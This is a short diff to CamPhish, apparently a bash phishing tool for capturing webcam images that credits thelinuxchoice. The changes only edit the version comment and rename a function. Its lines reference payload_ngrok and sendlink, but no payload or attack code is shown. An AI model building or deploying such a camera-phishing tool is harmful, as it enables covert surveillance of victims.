@@ -1,5 +1,5 @@
 #!/bin/bash
-# CamPhish v1.1
+# CamPhish v1.0
 # Powered by TechChip
 # Credits goes to thelinuxchoice [github.com/thelinuxchoice/]
 
@@ -199,7 +199,7 @@ payload_ngrok
 checkfound
 }
 
-start1() {
+camphish() {
 if [[ -e sendlink ]]; then
 rm -rf sendlink
 fi
@@ -222,7 +222,7 @@ else
 printf "\e[1;93m [!] Invalid option!\e[0m\n"
 sleep 1
 clear
-start1
+camphish
 fi
 
 }
@@ -266,5 +266,5 @@ checkfound
 
 banner
 dependencies
-start1
+camphish
 
